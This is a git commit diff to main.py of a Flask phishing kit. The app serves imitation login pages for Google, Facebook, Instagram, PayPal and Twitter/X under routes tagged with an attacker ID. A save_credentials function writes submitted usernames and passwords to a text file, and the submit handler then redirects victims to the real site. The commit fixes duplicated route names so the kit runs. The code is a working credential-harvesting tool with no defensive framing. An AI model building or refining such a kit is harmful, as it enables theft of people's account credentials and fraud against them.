3239e93ee14bf3d632513048f08dcd6d7ac9d82f
MansoorAhmedOfficial <mansoorahmedofficial@outlook.com>
2025-02-25 23:27:12 +0530

    fixed routes bugs && added grid for instgram page"

--- main.py
+++ main.py
@@ -6,7 +6,8 @@ app = Flask(__name__)
 
 def save_credentials(platform, username, password):
     with open("credentials.txt", "a") as f:
-        f.write(f"Platform: {platform}, Username: {username}, Password: {password}\n")
+        f.write(
+            f"Platform: {platform}, Username: {username}, Password: {password}\n")
 
 
 @app.route('/')
@@ -23,21 +24,20 @@ def google_login(attacker_id):
 def facebook_login(attacker_id):
     return render_template('facebook.html', attacker_id=attacker_id)
 
+
 @app.route('/instagram-login/<attacker_id>')
-def facebook_login(attacker_id):
-    return render_template('instgram.html', attacker_id=attacker_id)
+def instgram_login(attacker_id):
+    return render_template('instagram.html', attacker_id=attacker_id)
+
 
 @app.route('/paypal-login/<attacker_id>')
-def facebook_login(attacker_id):
+def paypla_login(attacker_id):
     return render_template('paypal.html', attacker_id=attacker_id)
 
-@app.route('/twitter-login/<attacker_id>')
-def facebook_login(attacker_id):
-    return render_template('twitter.html', attacker_id=attacker_id)
 
-@app.route('/facebook-login/<attacker_id>')
-def facebook_login(attacker_id):
-    return render_template('facebook.html', attacker_id=attacker_id)
+@app.route('/twitter-login/<attacker_id>')
+def twitter_login(attacker_id):
+    return render_template('twitter-x.com.html', attacker_id=attacker_id)
 
 
 @app.route('/submit', methods=['POST'])
@@ -52,6 +52,7 @@ def submit():
     elif platform == "Facebook":
         return redirect("https://facebook.com")
     return "Success"
+
 
 if __name__ == "__main__":
     app.run(debug=True, host="127.0.0.1", port=5000)
